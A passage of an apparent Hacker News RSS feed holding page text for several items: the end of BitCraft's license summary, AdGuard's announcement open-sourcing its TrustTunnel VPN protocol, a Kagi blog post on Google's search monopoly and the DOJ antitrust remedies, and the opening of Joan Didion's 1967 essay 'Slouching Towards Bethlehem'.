    &lt;p&gt;The BitCraft source code is licensed under the Apache 2.0 license. See LICENSE for license details. The license applies only to the contents of this repository. It doesn't extend to any other assets or code that is not part of BitCraftPublic. For more information see NOTICE.&lt;/p&gt;
    &lt;p&gt;To avoid any confusion, here is a clear summary what is allowed and what is not allowed:&lt;/p&gt;
    &lt;p&gt;You can:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Read and study the code to better understand how the game works&lt;/item&gt;
      &lt;item&gt;Modify and experiment with the code locally&lt;/item&gt;
      &lt;item&gt;Run your own servers for experimentation&lt;/item&gt;
      &lt;item&gt;Use it as a reference for building your own projects&lt;/item&gt;
      &lt;item&gt;Make a game similar to BitCraft with your own IP (art and themes) using our code as a basis&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You cannot:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use BitCraft‚Äôs art, game content, music, or other protected assets&lt;/item&gt;
      &lt;item&gt;Use BitCraft‚Äôs IP or present forks as official&lt;/item&gt;
      &lt;item&gt;Share information about any discovered exploits in the game with anyone other than us&lt;/item&gt;
      &lt;item&gt;Operate official, unofficial, private or any otherwise competing BitCraft servers&lt;/item&gt;
      &lt;item&gt;Do anything that violates the open source license&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The game‚Äôs assets and IP remain protected, and the official BitCraft servers will continue to be operated by us.&lt;/p&gt;
    &lt;p&gt;For more information see NOTICE.&lt;/p&gt;
    &lt;p&gt;This repository is released as part of our commitment to openness and long-term collaboration with the community. It is not connected to the live game infrastructure, and any changes here will not affect the official BitCraft servers.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708592</guid><pubDate>Wed, 21 Jan 2026 17:20:39 +0000</pubDate></item><item><title>TrustTunnel: AdGuard VPN protocol goes open-source</title><link>https://adguard-vpn.com/en/blog/adguard-vpn-protocol-goes-open-source-meet-trusttunnel.html</link><description>&lt;doc fingerprint="3c516d5bcf33e1d7"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;We‚Äôve kept our promise: AdGuard VPN protocol goes open-source ‚Äî meet TrustTunnel&lt;/head&gt;
    &lt;p&gt;Today is a big day for us, and for everyone who cares about transparency, privacy, and having full control over their own traffic. We‚Äôre finally open-sourcing the protocol that powers AdGuard VPN. And it now has a name: TrustTunnel.&lt;/p&gt;
    &lt;p&gt;For a long time, we‚Äôve wanted to make the protocol public. Many of you asked for it, and we always said: yes, we will, it‚Äôs only a matter of time. Well, the time has come.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is TrustTunnel?&lt;/head&gt;
    &lt;p&gt;At its core, TrustTunnel is a modern, secure, mobile-optimized VPN protocol. It‚Äôs the very same technology that has been running inside all AdGuard VPN apps: on mobile, desktop, and browser extensions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why TrustTunnel? Because we needed something better&lt;/head&gt;
    &lt;p&gt;There are plenty of VPN protocols out there, so why create our own, some might ask. That is because we‚Äôve seen in practice the faults of popular VPN protocols, especially in countries with tight restrictions on internet access. Protocols like OpenVPN, WireGuard, and IPSec share common weaknesses: they are easy to detect and block at the network level, and attempts to conceal VPN traffic often reduce speed. Traditional approaches ‚Äúwrap‚Äù VPN data in a TCP connection and mimic normal web traffic, but TCP‚Äôs way of confirming every piece of data creates delays and makes the connection slower.&lt;/p&gt;
    &lt;p&gt;Unlike those conventional VPN protocols, TrustTunnel is engineered to blend in with regular HTTPS traffic, making it far harder to throttle or block and helping it slip past deep-packet inspection, all while preserving strong privacy and security. It achieves this through TLS-based encryption, the same standard that secures HTTPS, and by leveraging HTTP/2 or HTTP/3 transport, which are ubiquitous on the web. Each connection runs on its own dedicated stream, which combines packets for faster, more efficient transmission. It is also optimized for mobile platforms and performs well even in unstable network conditions.&lt;/p&gt;
    &lt;head rend="h2"&gt;A protocol you can use, run, tweak, extend, and build upon&lt;/head&gt;
    &lt;p&gt;By releasing TrustTunnel, we hope to achieve two things. First of all, we want to finally show our users what protocol is powering AdGuard VPN, thus allowing them to audit it openly. At AdGuard, we have always been staunch supporters of the idea of open-source software, and many of our products have long been open source. AdGuard VPN was lagging behind in this regard, but with TrustTunnel being released publicly, it is starting to catch up.&lt;/p&gt;
    &lt;p&gt;But most importantly, we want to change the status quo in the world of VPN protocols and offer an alternative to existing solutions. That said, we do not want it to be just a PR stunt, when the protocol‚Äôs code is de-facto ‚Äòopen source,‚Äô but only one VPN service actually runs it. We believe in free and open-source software (FOSS) and want TrustTunnel to be used widely, including by other VPN services. We believe this is the right way to go about open source development, and we hope the community will participate in the TrustTunnel evolution. We welcome any contribution, whether it is a feature request, a bug report, or even a direct contribution to the app‚Äôs development.&lt;/p&gt;
    &lt;p&gt;What have we done to make this possible?&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;We are publishing the first version of the TrustTunnel specification.&lt;/item&gt;
      &lt;item&gt;We are releasing the complete code of our reference implementation of the TrustTunnel server and its clients under a very permissive license.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You don‚Äôt have to install AdGuard VPN to use TrustTunnel. You can configure your own server and use open source TrustTunnel clients:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Command-line TrustTunnel clients support Linux, Windows, and macOS&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;We are also releasing two client apps for iOS and Android&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TrustTunnel clients already have a lot of functionality, they allow you to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Use flexible routing rules to decide which requests go through the tunnel and which stay on the local network&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Exercise fine-grained control, separating work and personal traffic, routing specific domains or apps, and tuning network behavior without complicated setup&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Benefit from a real-time request log that provides full transparency into where the device sends traffic, how routing rules apply, and which connections use the tunnel&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Useful links&lt;/head&gt;
    &lt;p&gt;This is a long-awaited moment for us. We promised to open-source our protocol, and today we‚Äôre delivering on that promise. With TrustTunnel now open source, users and developers alike can explore, self-host, and build on the technology.&lt;/p&gt;
    &lt;p&gt;To get started, check out the following resources:&lt;lb/&gt; TrustTunnel website&lt;lb/&gt; TrustTunnel open-source repository on GitHub&lt;lb/&gt; TrustTunnel app for iOS&lt;lb/&gt; TrustTunnel app for Android&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708601</guid><pubDate>Wed, 21 Jan 2026 17:21:26 +0000</pubDate></item><item><title>Waiting for dawn in search: Search index, Google rulings and impact on Kagi</title><link>https://blog.kagi.com/waiting-dawn-search</link><description>&lt;doc fingerprint="19c2dbe203a4134e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Waiting for dawn in search: Search index, Google rulings and impact on Kagi&lt;/head&gt;
    &lt;p&gt;This blog post is a follow-up to Dawn of a new era in Search, published last year. A lot has changed: the legal case has advanced, AI has become the central battleground, and the need for open index access has only grown sharper.&lt;/p&gt;
    &lt;p&gt;As of late 2025, one company decides what nearly 9 out of 10 people see when they search the web: Google. On August 5, 2024, a U.S. court officially ruled that Google is a monopolist in general search services. This ruling is not about ads or browser defaults alone. It is about who controls the index that powers both search and AI - and whether anyone else is allowed to build on it.&lt;/p&gt;
    &lt;p&gt;The stakes have grown sharper over the past year. LLMs hallucinate without grounding in real-world information; every agent that answers questions about the real world, depends on search. LLMs themselves are a blend of proprietary and open source. Cloud compute is competitive. But search is different - only one company controls a comprehensive, fresh, high-quality web index. If one company controls the index, it controls the floor on how good AI can be - and who gets to build it. The innovation crunch in search is now an innovation crunch in AI.&lt;/p&gt;
    &lt;p&gt;We are writing this from a position we believe in: people should have the choice to access information without behaviour-changing, ad-driven, intermediary standing between them and knowledge.&lt;/p&gt;
    &lt;p&gt;Why does this matter? The information we consume shapes our understanding of the world as profoundly as the food we eat shapes our bodies. Search (directly, and indirectly through AI) is the primary mechanism through which we inform political judgments, financial decisions, medical choices, and countless other consequential aspects of our lives. When a single company controls the gateway to information - and operates that gateway in ways misaligned with user interests - it influences not only what we know, but how we reason.&lt;/p&gt;
    &lt;head rend="h2"&gt;The problem: A search monopoly&lt;/head&gt;
    &lt;p&gt;The data is stark.&lt;/p&gt;
    &lt;p&gt;Worldwide search market share (October 2025, StatCounter):&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Search Engine&lt;/cell&gt;
        &lt;cell role="head"&gt;Market Share&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;90.06%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Bing&lt;/cell&gt;
        &lt;cell&gt;4.31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yandex&lt;/cell&gt;
        &lt;cell&gt;1.84%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yahoo&lt;/cell&gt;
        &lt;cell&gt;1.45%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DuckDuckGo&lt;/cell&gt;
        &lt;cell&gt;0.89%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Baidu&lt;/cell&gt;
        &lt;cell&gt;0.73%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The United States is similar: Google at 85%, Bing at 9%, everyone else in the noise.&lt;/p&gt;
    &lt;p&gt;This is not a competitive market. It is a monopoly with a distant second place.&lt;/p&gt;
    &lt;p&gt;The search index is irreplaceable infrastructure. Building a comparable one from scratch is like building a parallel national railroad. Microsoft spent roughly $100 billion over 20 years on Bing and still holds single-digit share. If Microsoft cannot close the gap, no startup can do it alone.&lt;/p&gt;
    &lt;p&gt;This is exactly what the Sherman Act was designed to address: when one company‚Äôs control of critical infrastructure prevents effective competition, regulators must force open access on fair terms.&lt;/p&gt;
    &lt;p&gt;When a single, ad-driven gatekeeper controls the primary way humans reach information, it is not just competition that suffers - it is our collective ability to learn, to make informed medical and economic choices, and to participate meaningfully in democratic life.&lt;/p&gt;
    &lt;p&gt;As Ian Bremmer put it: ‚ÄúThe idea that we get our information as citizens through algorithms determined by the world‚Äôs largest advertising company is my definition of dystopia.‚Äù&lt;/p&gt;
    &lt;p&gt;Google‚Äôs own founders knew this. In their 1998 white paper, Sergey Brin and Larry Page sharply criticized the ad-supported search model for creating mixed motives and biasing results toward advertisers‚Äô interests. They wrote that ‚Äúadvertising funded search engines will be inherently biased towards the advertisers and away from the needs of the consumers‚Äù and that ‚Äúadvertising income often provides an incentive to provide poor quality search results.‚Äù Those concerns have only grown more pressing as search has become the primary interface between humanity and the web.&lt;/p&gt;
    &lt;head rend="h2"&gt;We tried to do it the right way&lt;/head&gt;
    &lt;p&gt;Kagi has always tried to integrate the best sources of knowledge into one coherent, ad-free experience. We see ourselves as connective tissue: letting people reach high-quality information directly, without passing through an ad system whose incentives are misaligned with their needs.&lt;/p&gt;
    &lt;p&gt;We approached every major index vendor seeking direct licensing on FRAND terms (Fair, Reasonable, And Non-Discriminatory): fair pricing, no mandatory ad syndication, ability to reorder and blend results. We succeeded with many, including:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Vendor&lt;/cell&gt;
        &lt;cell role="head"&gt;Status&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Mojeek&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Brave&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yandex&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Wikipedia&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;TripAdvisor&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yelp&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Apple&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Wolfram Alpha&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Our own Small Web Index&lt;/cell&gt;
        &lt;cell&gt;Proprietary&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;With Google and Bing, we failed - not for lack of trying.&lt;/p&gt;
    &lt;p&gt;Bing: Their terms didn‚Äôt work for us from the start. Microsoft‚Äôs terms prohibited reordering results or merging them with other sources - restrictions incompatible with Kagi‚Äôs approach. In February 2023, they announced price increases of up to 10x on some API tiers. Then in May 2025, they retired the Bing Search APIs entirely, effective August 2025, directing customers toward AI-focused alternatives like Azure AI Agents.&lt;/p&gt;
    &lt;p&gt;Google: Google does not offer a public search API. The only available path is an ad-syndication bundle with no changes to result presentation - the model Startpage uses. Ad syndication is a non-starter for Kagi‚Äôs ad-free subscription model.[^1]&lt;/p&gt;
    &lt;head rend="h2"&gt;The current interim approach&lt;/head&gt;
    &lt;p&gt;Because direct licensing isn‚Äôt available to us on compatible terms, we - like many others - use third-party API providers for SERP-style results (SERP meaning search engine results page). These providers serve major enterprises (according to their websites) including Nvidia, Adobe, Samsung, Stanford, DeepMind, Uber, and the United Nations.&lt;/p&gt;
    &lt;p&gt;This is not our preferred solution. We plan to exit it as soon as direct, contractual access becomes available. There is no legitimate, paid path to comprehensive Google or Bing results for a company like Kagi. Our position is clear: open the search index, make it available on FRAND terms, and enable rapid innovation in the marketplace.&lt;/p&gt;
    &lt;head rend="h2"&gt;The DOJ ruling&lt;/head&gt;
    &lt;p&gt;The Google antitrust case began in 2020. On August 5, 2024, the court ruled Google violated Section 2 of the Sherman Act by unlawfully maintaining its monopoly through exclusive distribution agreements. (Full ruling)&lt;/p&gt;
    &lt;p&gt;On September 2, 2025, the DOJ announced remedies (press release):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Limits on exclusivity: Google is prohibited from exclusive contracts related to Search, Chrome, Assistant, and Gemini.&lt;/item&gt;
      &lt;item&gt;Data sharing and syndication: Google must provide search index and interaction data to competitors and offer syndication services to help rivals build competitive search.&lt;/item&gt;
      &lt;item&gt;Addressing monopolization tactics: The remedies aim to dismantle a decade of exclusionary agreements.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In December 2025, Judge Mehta issued a memorandum outlining the specific remedies the court intends to impose. The details are significant:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Mandatory syndication: Google must offer query-based search syndication to ‚ÄúQualified Competitors‚Äù on terms no less favorable than those provided to current partners.&lt;/item&gt;
      &lt;item&gt;No ad bundling: Google cannot condition access to search results on the use of Google Ads; competitors are free to monetize via their own ads or third parties.&lt;/item&gt;
      &lt;item&gt;Index data access: Google must provide Web Search Index data (URLs, crawl metadata, spam scores) at marginal cost.&lt;/item&gt;
      &lt;item&gt;Duration: The judgment remains in effect for 6 years, with syndication licenses guaranteed for terms of 5 years.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If implemented as outlined, this is exactly what we have been asking for. The legal trajectory is promising. Google will contest details, and final enforceable terms are still being worked out. The fight now is ensuring these remedies become real, practical access - not paper compliance.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why enforcement matters now&lt;/head&gt;
    &lt;p&gt;Even as these remedies take shape, Google is moving to close the back door. In December 2025, Google sued SerpApi for scraping its results at scale.&lt;/p&gt;
    &lt;p&gt;We take a measured, principled view:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Context matters: Google built its index by crawling the open web before robots.txt was a widespread norm, often over publishers‚Äô objections. Today, publishers ‚Äúconsent‚Äù to Google‚Äôs crawling because the alternative - being invisible on a platform with 90% market share - is economically unacceptable. Google now enforces ToS and robots.txt against others from a position of monopoly power it accumulated without those constraints. The rules Google enforces today are not the rules it played by when building its dominance.&lt;/item&gt;
      &lt;item&gt;The structural problem remains: This lawsuit is only necessary because Google refuses to offer legitimate, paid index access.&lt;/item&gt;
      &lt;item&gt;Our position is unchanged: We have always wanted direct licensing. We would happily pay market rates for clean, contractual access. The fact that we - and companies like Stanford, Nvidia, Adobe, and the United Nations - have had to rely on third-party vendors is a symptom of the closed ecosystem, not a preference.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The connection to DOJ remedies is direct: if Google is going to close the back door, regulators must ensure the front door is open. That is exactly what the DOJ‚Äôs index syndication requirements are meant to achieve - and why we support their full implementation.&lt;/p&gt;
    &lt;head rend="h2"&gt;What could be: A layered search ecosystem&lt;/head&gt;
    &lt;p&gt;The DOJ ruling does not itself create a healthy market, but it makes one possible.&lt;/p&gt;
    &lt;p&gt;And while this post focuses on remedies and their impact on Kagi, it is worth zooming out: even if those remedies work perfectly, long-term societal prosperity and resilience require a non-commercial baseline for access to information - something that is not dependent on ad incentives or a single vendor‚Äôs business priorities. Think of it as a north-star model for a modern society where information access is a fundamental right.&lt;/p&gt;
    &lt;p&gt;Here is what that could look like:&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 1: Search as a public good&lt;/head&gt;
    &lt;p&gt;This is a long-term possibility, not a near-term expectation. A government-backed, ad-free, intermediary-free, taxpayer-funded search service providing baseline, non-discriminatory access to information. Imagine search.org.&lt;/p&gt;
    &lt;p&gt;This is not something the DOJ remedies create directly, nor something Kagi expects to exist soon. It is included here to make explicit what an open-index world could ultimately make possible.&lt;/p&gt;
    &lt;p&gt;This layer would replace the role public libraries played for centuries - a role that effectively disappeared when commercial web search took over in the late 1990s. Our ancestors understood well the benefits that non-discriminatory, direct access to information brings to citizens, and ultimately society itself.&lt;/p&gt;
    &lt;p&gt;It raises hard questions: governance, funding, political independence, precedent. But the principle is sound. Every citizen should have access to information without an ad-optimized algorithm standing between them and knowledge. If we can fund public libraries, we can fund public search.&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 2: Free, ad-based search&lt;/head&gt;
    &lt;p&gt;Commercial search engines with richer features, funded by advertising. Users understand the tradeoff and have a genuine public alternative. This is the space where most contemporary search engines operate.&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 3: Paid, subscription-based search&lt;/head&gt;
    &lt;p&gt;Premium search engines offering the highest possible quality, privacy, and advanced features for users who value this and are willing to pay. This is where Kagi operates - and where we are expanding as an integrator of knowledge across search, browser, mail, and AI assistants, without selling your attention.&lt;/p&gt;
    &lt;p&gt;This layered model creates a diverse ecosystem:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A public baseline for information access.&lt;/item&gt;
      &lt;item&gt;Commercial free options for convenience and reach.&lt;/item&gt;
      &lt;item&gt;Premium paid options for those who want maximum quality and control.&lt;/item&gt;
      &lt;item&gt;Aligns with the primary purpose of the Sherman Act.[^2]&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;The DOJ ruling is starting to do what antitrust is supposed to do: turn a closed, private choke point into shared infrastructure that others can build on. If the remedies land as real, usable access (APIs, cost-based pricing, no ad bundling), the web can support a layered ecosystem again: a public baseline for citizens, free ad-supported products for reach, and paid services that compete on quality, privacy, and power-user features.&lt;/p&gt;
    &lt;p&gt;That is the world we are building Kagi for. We are ready to walk through the front door - not depend on gray-market workarounds. Our job now is to be ready when the door opens, and to help make sure it does: keep Kagi genuinely multi-source, keep investing in our Small Web Index, and keep shipping a subscription search experience that delivers the best results across providers. If we get this right, the next decade of search and AI does not have to be one funnel owned by one company. It can be a competitive stack of layers that treats information access as the public good it has always been.&lt;/p&gt;
    &lt;head rend="h2"&gt;References&lt;/head&gt;
    &lt;head rend="h4"&gt;DOJ v. Google&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;UNITED STATES OF AMERICA v. GOOGLE LLC, 1:20-cv-03010 √¢ Full case docket on CourtListener&lt;/item&gt;
      &lt;item&gt;Memorandum Opinion √¢ Judge Amit Mehta (PDF) √¢ Court ruling finding Google violated antitrust law&lt;/item&gt;
      &lt;item&gt;Department of Justice Wins Significant Remedies Against Google √¢ DOJ press release announcing remedies, September 2, 2025&lt;/item&gt;
      &lt;item&gt;Judge Mehta‚Äôs Remedies Memorandum (PDF) √¢ December 2025&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Market data and commentary&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Search Engine Market Share Worldwide √¢ StatCounter, October 2025&lt;/item&gt;
      &lt;item&gt;Search Engine Market Share United States √¢ StatCounter, October 2025&lt;/item&gt;
      &lt;item&gt;Ian Bremmer on algorithmic information access √¢ Commentary on ad-driven search&lt;/item&gt;
      &lt;item&gt;The Anatomy of a Large-Scale Hypertextual Web Search Engine √¢ Original Google white paper by Brin &amp;amp; Page, Stanford, 1998&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Third-party search API providers&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Google lobs lawsuit at search result scraping firm √¢ Ars Technica coverage of Google‚Äôs litigation&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Footnotes&lt;/head&gt;
    &lt;p&gt;[^1]: A note on Google‚Äôs existing APIs: Google offers PSE, designed for adding search boxes to websites. It can return web results, but with reduced scope and terms tailored for that narrow use case. More recently, Google offers Grounding with Google Search through Vertex AI, intended for grounding LLM responses. Neither is general-purpose index access. Programmable Search Engine is not designed for building competitive search. Grounding with Google Search is priced at $35 per 1,000 requests - economically unviable for search at scale, and structured as an AI add-on rather than standalone index syndication. These are not the FRAND terms the market needs.&lt;/p&gt;
    &lt;p&gt;[^2]: Our understanding of the primary purpose of the Sherman Act is not to shield competitors from the success of legitimate businesses or to prevent those businesses from earning fair profits. Rather, it is to preserve a competitive marketplace that protects consumers from harm (see Competition law and consumer protection, Kluwer Law International, pp. 291√¢293). Opening the search index would create healthy, real, and intense competition in the search space - including competition to Kagi - which aligns with our understanding of the Sherman Act‚Äôs intent. The goal is not the elimination of dominant firms, but the prevention of a single, closed index from becoming the only gateway to information.&lt;/p&gt;
    &lt;p&gt;Published by Vladimir Prelovac and Raghu Murthi on January 21, 2026.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708678</guid><pubDate>Wed, 21 Jan 2026 17:28:03 +0000</pubDate></item><item><title>Slouching Towards Bethlehem ‚Äì Joan Didion (1967)</title><link>https://www.saturdayeveningpost.com/2017/06/didion/</link><description>&lt;doc fingerprint="3e299157a9e40435"&gt;
  &lt;main&gt;
    &lt;p&gt;[Editor‚Äôs note: Joan Didion‚Äôs ‚ÄúSlouching Towards Bethlehem‚Äù was first published in the September 23, 1967, edition of the Post. We republish it here as part of our 50th anniversary commemoration of the Summer of Love. Scroll to the bottom to see this story as it appeared in the magazine.]&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Things fall apart; the center cannot hold;&lt;/p&gt;&lt;lb/&gt;Mere anarchy is loosed upon the world . . .&lt;lb/&gt;Surely some revelation is at hand;&lt;lb/&gt;Surely the Second Coming is at hand . . .&lt;lb/&gt;And what rough beast, its hour come round at last,&lt;lb/&gt;Slouches towards Bethlehem to be born?&lt;lb/&gt;‚ÄîW.B. Yeats&lt;/quote&gt;
    &lt;p&gt;The center was not holding. It was a country of bankruptcy notices and public-auction announcements and commonplace reports of casual killings and misplaced children and abandoned homes and vandals who misspelled even the four-letter words they scrawled. It was a country in which families routinely disappeared, trailing bad checks and repossession papers. Adolescents drifted from city to torn city, sloughing off both the past and the future as snakes shed their skins, children who were never taught and would never now learn the games that had held the society together. People were missing. Children were missing. Parents were missing. Those who were left behind filed desultory missing-persons reports, then moved on themselves.&lt;/p&gt;
    &lt;p&gt;It was not a country in open revolution. It was not a country under enemy siege. It was the United States of America in the year 1967, and the market was steady and the GNP high, and a great many articulate people seemed to have a sense of high social purpose, and it might have been a year of brave hopes and national promise, but it was not, and more and more people had the uneasy apprehension that it was not. All that seemed clear was that at some point we had aborted ourselves and butchered the job, and because nothing else seemed so relevant I decided to go to San Francisco. San Francisco was where the social hemorrhaging was showing up. San Francisco was where the missing children were gathering and calling themselves ‚Äúhippies.‚Äù When I first went to San Francisco, I did not even know what I wanted to find out, and so I just stayed around awhile and made a few friends.&lt;/p&gt;
    &lt;p&gt;A sign on Haight Street, San Francisco:&lt;lb/&gt; Last Easter Day&lt;lb/&gt; My Christopher Robin wandered away.&lt;lb/&gt; He called April 10th&lt;lb/&gt; But he hasn‚Äôt called since&lt;lb/&gt; He said he was coming home&lt;lb/&gt; But he hasn‚Äôt shown.&lt;/p&gt;
    &lt;p&gt;If you see him on Haight&lt;lb/&gt; Please tell him not to wait&lt;lb/&gt; I need him now&lt;lb/&gt; I don‚Äôt care how&lt;lb/&gt; If he needs the bread&lt;lb/&gt; I‚Äôll send it ahead.&lt;/p&gt;
    &lt;p&gt;If there‚Äôs hope&lt;lb/&gt; Please write me a note&lt;lb/&gt; If he‚Äôs still there&lt;lb/&gt; Tell him how much I care&lt;lb/&gt; Where he‚Äôs at I need to know&lt;lb/&gt; For I really love him so!&lt;/p&gt;
    &lt;p&gt;Deeply,&lt;lb/&gt; Marla&lt;/p&gt;
    &lt;p&gt;I am looking for somebody called Deadeye (all single names in this story are fictitious; full names are real), and I hear he is on the Street this afternoon doing a little business, so I keep an eye out for him and pretend to read the signs in the Psychedelic Shop on Haight Street when a kid, 16, 17, comes in and sits on the floor beside me.&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat are you looking for?‚Äù he says.&lt;/p&gt;
    &lt;p&gt;I say nothing much.&lt;/p&gt;
    &lt;p&gt;‚ÄúI been out of my mind for three days,‚Äù he says. He tells me he‚Äôs been shooting crystal, which I pretty much know because he does not bother to keep his sleeves rolled down over the needle tracks. He came up from Los Angeles some number of weeks ago, he doesn‚Äôt remember what number, and now he‚Äôll take off for New York, if he can find a ride. I show him a sign on the wall offering a ride to Chicago. He wonders where Chicago is. I ask where he comes from. ‚ÄúHere,‚Äù he says. I mean before here. ‚ÄúSan Jose. Chula Vista, I dunno,‚Äù he says. ‚ÄúMy mother‚Äôs in Chula Vista.‚Äù&lt;/p&gt;
    &lt;p&gt;A few days later I see him in Golden Gate Park. I ask if he has found a ride to New York. ‚ÄúI hear New York‚Äôs a bummer,‚Äù he says.&lt;/p&gt;
    &lt;p&gt;Deadeye never showed up that day, and somebody says maybe I can find him at his place. It is three o‚Äôclock and Deadeye is in bed. Somebody else is asleep on the living-room couch, and a girl is sleeping on the floor beneath a poster of Allen Ginsberg, and there are a couple of girls in pajamas making instant coffee. One of the girls introduces me to the friend on the couch, who extends one arm but does not get up because he is naked. Deadeye and I have a mutual acquaintance, but he does not mention his name in front of the others. ‚ÄúThe man you talked to,‚Äù he says, or ‚Äúthat man I was referring to earlier.‚Äù The man is a cop.&lt;/p&gt;
    &lt;p&gt;The room is overheated and the girl on the floor is sick. Deadeye says she has been sleeping for 24 hours. ‚ÄúLemme ask you something,‚Äù he says. ‚ÄúYou want some grass?‚Äù I say I have to be moving on. ‚ÄúYou want it,‚Äù Deadeye says, ‚Äúit‚Äôs yours.‚Äù Deadeye used to be a Hell‚Äôs Angel around Los Angeles, but that was a few years ago. ‚ÄúRight now,‚Äù he says, ‚ÄúI‚Äôm trying to set up this groovy religious group ‚Äî ‚ÄòTeen-age Evangelism.‚Äô‚Äù&lt;/p&gt;
    &lt;p&gt;Don and Max want to go out to dinner, but Don is on a macrobiotic diet so we end up in Japantown. Max is telling me how he lives free of all the old middle-class Freudian hang-ups. ‚ÄúI‚Äôve had this old lady for a couple of months now, maybe she makes something special for my dinner, and I come in three days late and tell her I‚Äôve been with some other chick, well, maybe she shouts a little but then I say, ‚ÄòThat‚Äôs me, baby,‚Äô and she laughs and says, ‚ÄòThat‚Äôs you, Max. ‚Äò‚Äú Max says it works both ways. ‚ÄúI mean, if she comes in and tells me she wants to have Don, maybe, I say, ‚ÄòOK, baby, it‚Äôs your trip.‚Äô‚Äù&lt;/p&gt;
